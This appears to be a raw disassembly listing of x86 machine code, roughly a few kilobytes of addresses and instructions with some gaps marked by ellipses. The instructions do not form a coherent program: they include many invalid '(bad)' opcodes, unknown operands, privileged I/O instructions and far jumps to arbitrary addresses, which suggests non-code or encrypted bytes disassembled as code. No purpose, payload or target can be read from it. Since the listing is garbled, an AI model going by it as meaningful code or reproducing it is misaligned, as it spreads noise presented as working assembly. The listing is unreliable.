  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	mov    ds:0x67b9fc9f,al
  413f67:	xlat   BYTE PTR ds:[ebx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	fsubr  DWORD PTR [ebx+0x22d5eb0c]
  413f74:	lods   al,BYTE PTR ds:[esi]
  413f75:	mov    ebx,0xa17e0cc3
  413f7a:	in     eax,dx
  413f7b:	fnsave [ebx+0x31c86991]
  413f81:	add    eax,0xbb8749b7
  413f86:	inc    ebx
  413f87:	sbb    eax,0xa0d595e6
  413f8c:	jp     0x413f75
  413f8e:	lahf   
  413f8f:	stc    
  413f90:	and    al,0xb
  413f92:	loope  0x413ff9
  413f94:	pop    es
  413f95:	xchg   esp,eax
  413f96:	in     eax,dx
  413f97:	mov    ebx,0xa64bdf18
  413f9c:	(bad)  
  413f9d:	adc    eax,0x5cf32874
  413fa2:	cmp    esp,DWORD PTR [ecx-0x57612296]
  413fa8:	mov    ds:0x82cd3c60,eax
  413fad:	xor    BYTE PTR [edi],ch
  413faf:	jg     0x413f7c
  413fb1:	mov    DWORD PTR [ebx],ebp
  413fb3:	xchg   ebp,eax
  413fb4:	adc    BYTE PTR [ebp+0x43],dl
  413fb7:	setno  BYTE PTR [edi]
  413fba:	test   BYTE PTR [eax+0x1f919015],cl
  413fc0:	add    ebx,DWORD PTR [ecx]
  413fc2:	sub    cl,BYTE PTR [esi+0x710d1a58]
  413fc8:	adc    edx,esi
  413fca:	std    
  413fcb:	adc    BYTE PTR [ebx-0x19034ff9],0x86
  413fd2:	mov    eax,ds:0x6dac833f
  413fd7:	fsubr  QWORD PTR [ecx]
  413fd9:	cmp    al,0xe9
  413fdb:	mov    dl,bl
  413fdd:	dec    eax
  413fde:	in     al,0x25
  413fe0:	fidiv  DWORD PTR [edi-0x41]
  413fe3:	popf   
  413fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fe5:	retf   
  413fe6:	or     ecx,DWORD PTR [edi+0x44adf583]
  413fec:	icebp  
  413fed:	imul   ebp,DWORD PTR [edi],0x11ee8840
  413ff3:	arpl   sp,ax
  413ff5:	xchg   esi,eax
  413ff6:	inc    ebp
  413ff7:	popf   
  413ff8:	addr16 xchg edi,eax
  413ffa:	sub    edx,esp
  413ffc:	dec    edx
  413ffd:	sub    esp,0x5605101b
  414003:	adc    eax,0x197066fc
  414008:	lea    edi,[ecx-0x64]
  41400b:	mov    ds:0xc52049f3,eax
  414010:	xchg   ebp,eax
  414011:	jo     0x41401c
  414013:	mov    dl,0xe5
  414015:	outs   dx,BYTE PTR ds:[esi]
  414016:	data16 mov bh,0xe3
  414019:	pop    edx
  41401a:	adc    cl,bh
  41401c:	jnp    0x414033
  41401e:	ins    DWORD PTR es:[edi],dx
  41401f:	cs fwait
  414021:	adc    DWORD PTR gs:[esi-0x45b5e463],ebx
  414028:	test   al,0x7f
  41402a:	push   es
  41402b:	shr    BYTE PTR [ecx],1
  41402d:	xchg   DWORD PTR [ebx-0x3a],ebp
  414030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414031:	dec    eax
  414032:	fst    st(5)
  414034:	sub    esi,ebp
  414036:	sbb    al,0xe9
  414038:	xchg   edx,eax
  414039:	push   eax
  41403a:	int    0x8c
  41403c:	mov    eax,ds:0xefa33bc3
  414041:	mov    al,0xb2
  414043:	jl     0x414047
  414045:	cmp    ch,BYTE PTR [edi]
  414047:	fistp  WORD PTR [ebx+0x36]
  41404a:	add    edi,DWORD PTR cs:[ebx-0x78]
  41404e:	xlat   BYTE PTR ds:[ebx]
  41404f:	fidiv  DWORD PTR [esi+0x73]
  414052:	inc    ebp
  414053:	sub    al,0x1c
  414055:	es mov ah,0x77
  414058:	cdq    
  414059:	push   es
  41405a:	push   ebp
  41405b:	sub    bh,BYTE PTR [esi+0x25]
  41405e:	retf   0x5fb8
  414061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414062:	sti    
  414063:	pop    ecx
  414064:	fld    st(4)
  414066:	lods   al,BYTE PTR ds:[esi]
  414067:	pop    edx
  414068:	add    ebp,edi
  41406a:	nop
  41406b:	pop    ss
  41406c:	mov    ch,0x75
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xeb53:0xd5d52e96
  4140e5:	icebp  
  4140e6:	fadd   DWORD PTR [bx+si]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    BYTE PTR [esi+ebx*1-0x6add5ee1],ch
  4140f4:	sub    eax,0xda4d26c8
  4140f9:	mul    DWORD PTR [edi+0x48d8be06]
  4140ff:	pop    esp
  414100:	outs   dx,DWORD PTR ds:[esi]
  414101:	and    eax,0x726711a3
  414106:	ja     0x4140c2
  414108:	retf   0x4576
  41410b:	xchg   ebx,eax
  41410c:	xchg   ebp,eax
  41410d:	(bad)  
  41410e:	xchg   ebx,eax
  41410f:	push   cs
  414110:	jmp    0x6f4b0a2e
  414115:	icebp  
  414116:	cli    
  414117:	fstp   QWORD PTR [ebx]
  414119:	push   ebx
  41411a:	lods   eax,DWORD PTR ds:[esi]
  41411b:	inc    eax
  41411c:	scas   eax,DWORD PTR es:[edi]
  41411d:	enter  0xc6df,0xeb
  414121:	pop    es
  414122:	sbb    DWORD PTR [esi],esi
  414124:	jo     0x41412f
  414126:	sub    eax,esp
  414128:	bnd ret 0xc005
  41412c:	aam    0x62
  41412e:	cmp    eax,DWORD PTR [ebp+0x42]
  414131:	sbb    BYTE PTR [ebp-0x69],cl
  414134:	inc    ecx
  414135:	pop    esp
  414136:	fs dec ecx
  414138:	ds push edi
  41413a:	inc    edx
  41413b:	cmp    al,0x98
  41413d:	xchg   edx,eax
  41413e:	cwde   
  41413f:	dec    ecx
  414140:	(bad)  
  414141:	push   ebp
  414142:	ficom  WORD PTR ds:0x879eacdb
  414148:	int3   
  414149:	nop
  41414a:	push   edx
  41414b:	mov    ah,0xdb
  41414d:	lds    esp,FWORD PTR [eax-0x611d35a3]
  414153:	neg    dh
  414155:	pop    ebx
  414156:	das    
  414157:	rcr    DWORD PTR [ecx-0x15],0x10
  41415b:	fdiv   st,st(4)
  41415d:	std    
  41415e:	(bad)  
  41415f:	dec    eax
  414160:	add    al,0x35
  414162:	xor    al,0x3e
  414164:	add    DWORD PTR [esi+0x41],esp
  414167:	mov    BYTE PTR [ecx],ch
  414169:	fidiv  WORD PTR [edx+0x36c617b9]
  41416f:	dec    eax
  414170:	fbld   TBYTE PTR [ebx-0x67]
  414173:	lea    ebx,[eax+0x6cdbdfd6]
  414179:	jo     0x414195
  41417b:	rol    BYTE PTR [ebp-0x38c6fee6],1
  414181:	and    eax,0x4f7311c0
  414186:	and    DWORD PTR [ecx-0x2955a5f],ecx
  41418c:	xchg   ecx,eax
  41418d:	int3   
  41418e:	inc    eax
  41418f:	test   BYTE PTR [edx],0xcc
  414192:	cmp    BYTE PTR [edi+0x5a],0xe
  414196:	jge    0x414149
  414198:	xor    eax,0xb3ce5ca7
  41419d:	fadd   st,st(0)
  41419f:	out    0x4,eax
  4141a1:	dec    ebp
  4141a3:	add    al,0x1b
  4141a5:	push   cs
  4141a6:	ror    BYTE PTR [edx+0x369ed594],cl
  4141ac:	cmp    ecx,DWORD PTR [edi]
  4141ae:	enter  0xe5e6,0xfb
  4141b2:	das    
  4141b3:	stc    
  4141b4:	cmc    
  4141b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141b6:	mov    ds:0xf0b95b5b,eax
  4141bb:	jbe    0x41417e
  4141bd:	sub    DWORD PTR [ebx],ebx
  4141bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141c0:	pop    es
  4141c1:	popa   
  4141c2:	call   0x4d3d9d78
  4141c7:	jecxz  0x41420e
  4141c9:	xchg   ebp,eax
  4141ca:	in     al,dx
  4141cb:	je     0x41423a
  4141cd:	es stc 
  4141cf:	push   0x200974dc
  4141d4:	idiv   BYTE PTR [ecx+0x39]
  4141d7:	dec    edi
  4141d8:	jp     0x414257
  4141da:	pop    eax
  4141db:	loope  0x414256
  4141dd:	mov    esp,0x858b05cb
  4141e2:	(bad)  
  4141e3:	xlat   BYTE PTR ds:[ebx]
  4141e4:	mov    WORD PTR [ecx+0x1e],ds
  4141e7:	lea    esi,[esi+eiz*4+0x76]
  4141eb:	pop    ebx
  4141ec:	scas   eax,DWORD PTR es:[edi]
  4141ed:	pop    ss
	...
  414256:	add    dl,BYTE PTR [edx]
  414258:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	mov    cl,0x3
  414264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414265:	repz fld DWORD PTR [bx+si]
  414269:	add    BYTE PTR [eax],al
  41426b:	add    DWORD PTR [eax],eax
  41426d:	add    BYTE PTR [ebx+0x3],dh
  414270:	add    dh,BYTE PTR [ecx-0x3af9213]
  414276:	ror    DWORD PTR [edi-0xd239200],cl
  41427c:	inc    edx
  41427d:	sbb    BYTE PTR [esi-0x56],0xea
  414281:	and    BYTE PTR [ecx],0x55
  414284:	cli    
  414285:	fisubr DWORD PTR [edx-0x55]
  414288:	push   ecx
  414289:	cdq    
  41428a:	cwde   
  41428b:	in     eax,dx
  41428c:	or     bl,BYTE PTR [eax+eax*1-0x2b50ad8d]
  414293:	cmp    bh,BYTE PTR [ebx-0x7fbfa499]
  414299:	(bad)  
  41429a:	popf   
  41429b:	ds or  al,0x1c
  41429e:	loope  0x41430f
  4142a0:	mov    ch,0xf
  4142a2:	ret    
  4142a3:	jno    0x41422e
  4142a5:	outs   dx,BYTE PTR ds:[esi]
  4142a6:	test   DWORD PTR [ebp+0x2b1a4ff],edx
  4142ac:	lods   eax,DWORD PTR ds:[esi]
  4142ad:	lea    esp,[esi-0x3a]
  4142b0:	(bad)  
  4142b1:	call   0xd766:0x9a90f2ae
  4142b8:	cli    
  4142b9:	add    ah,cl
  4142bb:	add    eax,0x694ecc79
  4142c0:	ja     0x4142a4
  4142c2:	xor    BYTE PTR [ebx-0x493c99f9],dl
  4142c8:	dec    ebx
  4142c9:	push   ss
  4142ca:	loop   0x414287
  4142cc:	add    eax,0x932d018a
  4142d1:	enter  0xa10a,0xe0
  4142d5:	gs xchg edx,eax
  4142d7:	call   0x5e07c1c6
  4142dc:	arpl   WORD PTR ds:0x43961ec4,dx
  4142e2:	in     al,0xc9
  4142e4:	fldenv [edx]
  4142e6:	push   ebx
  4142e7:	xchg   ecx,edx
  4142e9:	aaa    
  4142ea:	scas   eax,DWORD PTR es:[edi]
  4142eb:	dec    esp
  4142ec:	fild   DWORD PTR [ecx+edi*2+0x77c6d2e8]
  4142f3:	test   al,0x14
  4142f5:	xchg   edi,eax
  4142f6:	pop    ds
  4142f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f9:	pop    ebx
  4142fa:	push   0x7249ae0e
  4142ff:	or     BYTE PTR [ebp+ecx*4+0x49702631],0x7
  414307:	mov    dh,BYTE PTR [ebp+0x42b57ce]
  41430d:	sbb    BYTE PTR [eax],bl
  41430f:	xor    BYTE PTR [esi+0x6cd0a796],ah
  414315:	inc    ecx
  414316:	mov    edi,0xfd5bf466
  41431b:	test   BYTE PTR [eax],bh
  41431d:	fadd   QWORD PTR [edx-0x67cd68da]
  414323:	mov    bh,0x4b
  414325:	and    BYTE PTR [esi+0x6ed49c23],ch
  41432b:	cs sub eax,0xf24df5fa
  414331:	sub    al,0x99
  414333:	daa    
  414334:	inc    ebx
  414335:	js     0x41434d
  414337:	inc    edx
  414338:	into   
  414339:	loop   0x4142c6
  41433b:	idiv   BYTE PTR [ecx+0x4637e55c]
  414341:	imul   eax,DWORD PTR [eax+ecx*2],0xffffffd6
  414345:	popa   
  414346:	rol    DWORD PTR [ecx],1
  414348:	lods   al,BYTE PTR ds:[esi]
  414349:	dec    ebx
  41434a:	aad    0x6f
  41434c:	popf   
  41434d:	or     eax,0x46b2207c
  414352:	cmp    BYTE PTR [ebp-0x15],bh
  414355:	aad    0x76
  414357:	push   0x2a
  414359:	or     DWORD PTR [eax],esp
  41435b:	xor    edi,0x83f052ab
  414361:	mov    ebx,0x6c484c39
  414366:	push   edx
  414367:	dec    ebp
  414368:	push   esi
  414369:	or     al,0x4e
  41436b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41436c:	cs ja  0x41436f
	...
  4143d3:	add    BYTE PTR [eax],al
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	mov    bl,BYTE PTR [eax]
  4143e4:	pop    ecx
  4143e5:	dec    esi
  4143e6:	fiadd  DWORD PTR [bx+si]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [ebp+0x3f4c1900],ah
  4143f3:	cs fs imul ebx,esp,0xaab4b52f
  4143fb:	daa    
  4143fc:	sub    eax,0x92a98ec3
  414401:	(bad)  
  414402:	in     al,dx
  414403:	clc    
  414404:	push   ds
  414405:	sub    al,bh
  414407:	mov    ecx,0x63c6a438
  41440c:	sub    BYTE PTR [ebx-0x2f3a28f9],ah
  414412:	mov    dl,0x9b
  414414:	push   es
  414415:	into   
  414416:	pop    esp
  414417:	mov    edi,0xf18104b3
  41441c:	cs pop esi
  41441e:	inc    ebp
  41441f:	std    
  414420:	cli    
  414421:	pop    ds
  414422:	xlat   BYTE PTR ds:[bx]
  414424:	sub    BYTE PTR [ebx],0x17
  414427:	xchg   edx,eax
  414428:	xchg   bl,ah
  41442a:	jp     0x4144a0
  41442c:	mov    esi,DWORD PTR [ecx]
  41442e:	mov    ds:0x72caff1d,al
  414433:	dec    eax
  414434:	sbb    al,0xc
  414436:	cmp    DWORD PTR [ebx-0x45],0x501c3087
  41443d:	jmp    0xe8440b56
  414442:	(bad)  
  414443:	iret   
  414444:	aam    0xa9
  414446:	inc    edx
  414447:	in     eax,0xe7
  414449:	mov    bh,0x32
  41444b:	sbb    dh,dh
  41444d:	pop    ebp
  41444e:	xchg   esi,eax
  41444f:	or     eax,0x9094373c
  414454:	xor    ebx,esi
  414456:	mov    ch,BYTE PTR [ecx+0x18e1e9b8]
  41445c:	cli    
  41445d:	hlt    
  41445e:	outs   dx,BYTE PTR ds:[esi]
  41445f:	popf   
  414460:	or     DWORD PTR [edi+0x6e],edx
  414463:	adc    dh,ah
  414465:	xor    DWORD PTR [ebp+ecx*2-0x72],esi
  414469:	nop
  41446a:	cmp    eax,0x4e5afc0f
  41446f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414470:	imul   BYTE PTR [ebp+0x4c650a0a]
  414476:	add    BYTE PTR [edi-0x3c7ddf92],ah
  41447c:	mov    eax,ds:0x43f9aae6
  414481:	push   esp
  414482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414483:	add    BYTE PTR [ebp-0x520f4b5b],dl
  414489:	adc    dh,BYTE PTR [edi-0x5a]
  41448c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41448d:	ins    DWORD PTR es:[edi],dx
  41448e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41448f:	xor    eax,0x2b43568
  414494:	rcl    DWORD PTR [ebp+0x1b73c3c9],cl
  41449a:	inc    ecx
  41449b:	sbb    DWORD PTR [eax],esp
  41449d:	aam    0xbc
  41449f:	lods   eax,DWORD PTR ds:[esi]
  4144a0:	mov    esi,0xea09b565
  4144a5:	lea    ecx,[ecx]
  4144a7:	dec    ebp
  4144a8:	fmul   DWORD PTR [edi-0x6211abe3]
  4144ae:	fild   WORD PTR [eax-0x8]
  4144b1:	outs   dx,DWORD PTR ds:[esi]
  4144b2:	mov    ebp,0x6e15b03f
  4144b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b8:	lock ret 0xb911
  4144bc:	mov    ds:0xe156b938,al
  4144c1:	mov    BYTE PTR [edx-0x7d],ah
  4144c4:	jbe    0x414534
  4144c6:	push   ss
  4144c7:	mov    ecx,0xfb653211
  4144cc:	fcmovb st,st(1)
  4144ce:	shl    DWORD PTR [eax-0x38],0x6d
  4144d2:	add    BYTE PTR [ecx+ecx*4+0x3d],dh
  4144d6:	and    ah,BYTE PTR es:[eax]
  4144d9:	dec    esi
  4144da:	and    DWORD PTR [eax+edx*2],esi
  4144dd:	cdq    
  4144de:	dec    edi
  4144df:	or     eax,0xbf3896fb
  4144e4:	cli    
  4144e5:	mov    ebp,cs
  4144e7:	in     eax,0x2d
  4144e9:	call   0xf28581de
	...
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x4b]
  414563:	int    0x1f
  414565:	pop    ebp
  414566:	fild   DWORD PTR [bx+si]
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    BYTE PTR [esi+0x218be5cc],ah
  414573:	jg     0x4145a6
  414575:	lds    eax,FWORD PTR [edi-0x24]
  414578:	shl    DWORD PTR [edi+0x5c],0xe3
  41457c:	adc    al,0x92
  41457e:	push   eax
  41457f:	inc    edi
  414580:	jmp    0x2be05501
  414585:	or     al,0xa5
  414587:	gs mov ebx,db0
  41458b:	mov    ch,0x50
  41458d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41458e:	jns    0x414580
  414590:	jecxz  0x4145af
  414592:	aas    
  414593:	fwait
  414594:	jne    0x414569
  414596:	jle    0x41457c
  414598:	mov    ah,0xb3
  41459a:	call   0x43d6:0x411388c5
  4145a1:	jmp    0xbfc7:0x1178fbc9
  4145a8:	adc    BYTE PTR [edi],bl
  4145aa:	jbe    0x4145ef
  4145ac:	test   ch,al
  4145ae:	fcomp  DWORD PTR [edx-0x797ead7a]
  4145b4:	push   edi
  4145b5:	fidiv  DWORD PTR [edi+0x57bc1650]
  4145bb:	mov    ah,0x94
  4145bd:	jmp    0xb3f7a2e5
  4145c2:	mov    ah,0xf9
  4145c4:	loopne 0x4145c6
  4145c6:	jo     0x41454f
  4145c8:	jecxz  0x41455d
  4145ca:	div    DWORD PTR [edi]
  4145cc:	sbb    DWORD PTR [ecx+0x1ebef1f7],ecx
  4145d2:	and    cl,BYTE PTR [ebx-0x3]
  4145d5:	das    
  4145d6:	or     BYTE PTR [edx-0x6a6adff8],bh
  4145dc:	xor    al,0xd3
  4145de:	addps  xmm0,XMMWORD PTR [ebx+eiz*4-0x66]
  4145e3:	pusha  
  4145e4:	cmp    DWORD PTR [edx+0x1a],edx
  4145e7:	push   ss
  4145e8:	push   edi
  4145e9:	aad    0x75
  4145eb:	icebp  
  4145ec:	push   edx
  4145ed:	aas    
  4145ee:	pop    ebp
  4145ef:	mov    dh,0x16
  4145f1:	sub    DWORD PTR [esi+ebp*8+0x3efd7414],esp
  4145f8:	dec    ebx
  4145f9:	dec    esp
  4145fa:	in     eax,0xe4
  4145fc:	dec    ebx
  4145fd:	adc    eax,0xa01e1434
  414602:	xchg   esp,eax
  414603:	adc    al,0x5c
  414605:	xor    BYTE PTR [ecx],dl
  414607:	pop    es
  414608:	daa    
  414609:	rcl    esp,1
  41460b:	hlt    
  41460c:	dec    edi
  41460d:	iret   
  41460e:	sub    eax,0xbfe7716f
  414613:	add    eax,0x8f20720c
  414618:	aam    0x5a
  41461a:	pop    edx
  41461b:	mov    ch,0xe7
  41461d:	mov    ss,WORD PTR [ebx]
  41461f:	gs mov dl,0xe1
  414622:	es test ebx,ecx
  414625:	jbe    0x414632
  414627:	jae    0x414664
  414629:	or     al,0xe8
  41462b:	and    ch,dl
  41462d:	stos   DWORD PTR es:[edi],eax
  41462e:	ja     0x41465e
  414630:	pop    eax
  414631:	mov    bl,0xc0
  414633:	sbb    DWORD PTR [ecx],0xe676bace
  414639:	dec    edx
  41463a:	push   esp
  41463b:	cdq    
  41463c:	lds    eax,FWORD PTR [ecx+edx*2]
  41463f:	push   esi
  414640:	ins    DWORD PTR es:[edi],dx
  414641:	out    0xa0,eax
  414643:	nop
  414644:	add    dl,BYTE PTR ds:0x99087f49
  41464a:	or     ebx,DWORD PTR [edi+ebx*8]
  41464d:	div    BYTE PTR [ebx+edx*2+0x33]
  414651:	mov    bl,0x98
  414653:	cdq    
  414654:	cdq    
  414655:	in     al,0x2f
  414657:	sub    eax,ecx
  414659:	jge    0x4146b4
  41465b:	cdq    
  41465c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41465d:	shr    BYTE PTR [edi-0x80],1
  414660:	jmp    0x224:0xb3c9bd7d
  414667:	repnz inc ebp
  414669:	jmp    0x414678
  41466b:	lea    edx,[ebp+0x35]
	...
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x70
  4146e3:	imul   esi,DWORD PTR [edx-0xe],0xdc67
  4146ea:	add    BYTE PTR [ecx],al
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	or     bl,BYTE PTR [ecx+edi*2]
  4146f1:	inc    ebx
  4146f2:	push   eax
  4146f3:	in     al,dx
  4146f4:	mov    edi,0x2530f183
  4146f9:	mov    esi,0x16e28300
  4146fe:	xor    al,BYTE PTR ds:0xd14730e1
  414704:	push   ss
  414705:	or     al,0x69
  414707:	cwde   
  414708:	push   ds
  414709:	gs push eax
  41470b:	out    0x53,al
  41470d:	jp     0x414742
  41470f:	sub    BYTE PTR [edi],al
  414711:	and    DWORD PTR [eax+edi*4],ebx
  414714:	cmp    ch,BYTE PTR [edx+0x42e50094]
  41471a:	fst    QWORD PTR [esi]
  41471c:	mov    esi,0xd6e493c2
  414721:	dec    eax
  414722:	pop    esp
  414723:	jns    0x4146f5
  414725:	and    al,0x34
  414727:	cwde   
  414728:	mov    WORD PTR ss:[edx+0x48a8d37f],ss
  41472f:	daa    
  414730:	loope  0x414756
  414732:	les    edx,FWORD PTR ds:0x271f71e2
  414738:	sub    dl,ah
  41473a:	mov    WORD PTR [eax+0x24],?
  41473d:	or     eax,0xe832d17a
  414742:	push   0xe61144ef
  414747:	jbe    0x414780
  414749:	hlt    
  41474a:	jb     0x414736
  41474c:	or     eax,0xf08c7a76
  414751:	inc    eax
  414752:	xchg   esp,eax
  414753:	dec    eax
  414754:	mov    eax,ds:0x5dcd83cb
  414759:	out    dx,al
  41475a:	and    bh,bl
  41475c:	mov    ch,0x48
  41475e:	arpl   WORD PTR [ebx+edx*1-0x326758e9],ax
  414765:	pop    ds
  414766:	rcl    DWORD PTR [ebp+esi*1-0xed0e87d],0x76
  41476e:	data16 not BYTE PTR [edx]
  414771:	lock (bad) 
  414774:	test   al,0xff
  414776:	lock stc 
  414778:	xchg   esp,eax
  414779:	add    al,0xa8
  41477b:	mov    ?,esp
  41477d:	jl     0x414725
  41477f:	cs jb  0x4147b5
  414782:	dec    ebx
  414783:	xchg   edi,eax
  414784:	popf   
  414785:	loope  0x41474d
  414787:	pop    ecx
  414788:	sub    DWORD PTR gs:[ebp-0xb088abd],esi
  41478f:	js     0x4147a2
  414791:	outs   dx,BYTE PTR ds:[esi]
  414792:	sub    edx,DWORD PTR [esi+0x420846f3]
  414798:	rcr    BYTE PTR [edi],1
  41479a:	dec    edx
  41479b:	int3   
  41479c:	mov    edi,0x699f3e31
  4147a1:	fcmovb st,st(5)
  4147a3:	addr16 stc 
  4147a5:	pop    es
  4147a6:	lods   eax,DWORD PTR ds:[esi]
  4147a7:	push   ecx
  4147a8:	nop
  4147a9:	retf   
  4147aa:	mov    ch,0x97
  4147ac:	fcos   
  4147ae:	xchg   BYTE PTR [eax-0x16],al
  4147b1:	push   0x14ef7b80
  4147b6:	cmc    
  4147b7:	fsub   st(0),st
  4147b9:	add    cl,BYTE PTR [edx-0x258a9258]
  4147bf:	dec    eax
  4147c0:	pushf  
  4147c1:	inc    eax
  4147c2:	jmp    0x41480a
  4147c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c5:	push   edx
  4147c6:	mov    cl,ch
  4147c8:	mov    DWORD PTR [eax-0x5f],ecx
  4147cb:	jns    0x4147fe
  4147cd:	mov    dl,BYTE PTR [eax-0x53]
  4147d0:	push   eax
  4147d1:	cmc    
  4147d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d3:	loope  0x414800
  4147d5:	pop    ss
  4147d6:	sub    BYTE PTR [ebp+0x54],ch
  4147d9:	(bad)  
  4147da:	push   0xffffff9b
  4147dc:	nop
  4147dd:	cmp    ebp,DWORD PTR [eax+0x1ed5bb98]
  4147e3:	sar    BYTE PTR [ecx+0x234ba20],cl
  4147e9:	lea    esp,[eax+0x8dd1c6]
	...
  414853:	add    BYTE PTR [eax],al
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0xdf20b685
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    BYTE PTR [esi-0x3059fab4],bh
  414873:	stc    
  414874:	and    bh,ch
  414876:	test   DWORD PTR ds:0xd5f855b9,eax
  41487c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41487d:	fstp   QWORD PTR [esi+0x33]
  414880:	loop   0x414900
  414882:	push   esi
  414883:	je     0x4148e7
  414885:	mov    ds:0x73098b0b,al
  41488a:	xchg   ebp,eax
  41488b:	imul   ecx,DWORD PTR [edx+0x21],0x39f27f3c
  414892:	test   DWORD PTR [edx+0x4b],esi
  414895:	int3   
  414896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414897:	shl    BYTE PTR [ecx+0x79],1
  41489a:	push   ds
  41489b:	inc    esp
  41489c:	adc    bh,ch
  41489e:	push   ds
  41489f:	push   esp
  4148a0:	inc    edx
  4148a1:	fldenv [ecx-0x4c91cdf4]
  4148a7:	enter  0x1a71,0x67
  4148ab:	dec    ebx
  4148ac:	stos   BYTE PTR es:[edi],al
  4148ad:	dec    esi
  4148ae:	ins    DWORD PTR es:[edi],dx
  4148af:	dec    DWORD PTR ss:[esp+edi*8-0x135e4b82]
  4148b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b8:	and    al,BYTE PTR [esi+0xb]
  4148bb:	add    BYTE PTR [edi+0x71],ah
  4148be:	push   es
  4148bf:	xchg   edx,eax
  4148c0:	jle    0x4148ff
  4148c2:	cmp    ebx,eax
  4148c4:	or     DWORD PTR [esi],edi
  4148c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c7:	sti    
  4148c8:	cmp    ebx,edx
  4148ca:	and    al,BYTE PTR [ebx+0x48]
  4148cd:	call   0xaf0fc8b3
  4148d2:	outs   dx,DWORD PTR ds:[esi]
  4148d3:	push   0x5e4b2c3a
  4148d8:	pushf  
  4148d9:	xlat   BYTE PTR ds:[ebx]
  4148da:	outs   dx,DWORD PTR ds:[esi]
  4148db:	inc    edi
  4148dc:	lahf   
  4148dd:	das    
  4148de:	pop    esp
  4148df:	jmp    0xc202ecfb
  4148e4:	mov    ds:0x544bf74c,al
  4148e9:	repz jns 0x41487d
  4148ec:	or     DWORD PTR [ebp+ebx*8-0x75],ebx
  4148f0:	xor    DWORD PTR [eax+0x5e],edx
  4148f3:	inc    ebx
  4148f4:	fst    QWORD PTR [ecx]
  4148f6:	call   0xf56809f5
  4148fb:	sbb    edi,DWORD PTR [ebp+0x44d9b375]
  414901:	jmp    0x4148fa
  414903:	repz je 0x414977
  414906:	pop    ds
  414907:	stos   BYTE PTR es:[edi],al
  414908:	mov    bl,0x52
  41490a:	cs xchg ebx,eax
  41490c:	pusha  
  41490d:	mov    bl,0x70
  41490f:	adc    al,0x79
  414911:	dec    ebx
  414912:	inc    esi
  414913:	retf   0xb9f9
  414916:	out    0xb6,al
  414918:	dec    ebp
  414919:	xchg   edi,eax
  41491a:	adc    edx,DWORD PTR [edx+0xc]
  41491d:	xlat   BYTE PTR ds:[ebx]
  41491e:	add    bl,BYTE PTR [eax-0x3c]
  414921:	(bad)  
  414922:	fbld   TBYTE PTR [ebp+0x18]
  414925:	je     0x4148e0
  414927:	adc    DWORD PTR [ebx-0x12],edi
  41492a:	sbb    al,ch
  41492c:	sbb    eax,0x6066561d
  414931:	gs jne 0x41499b
  414934:	fwait
  414935:	data16 das 
  414937:	fwait
  414938:	cmc    
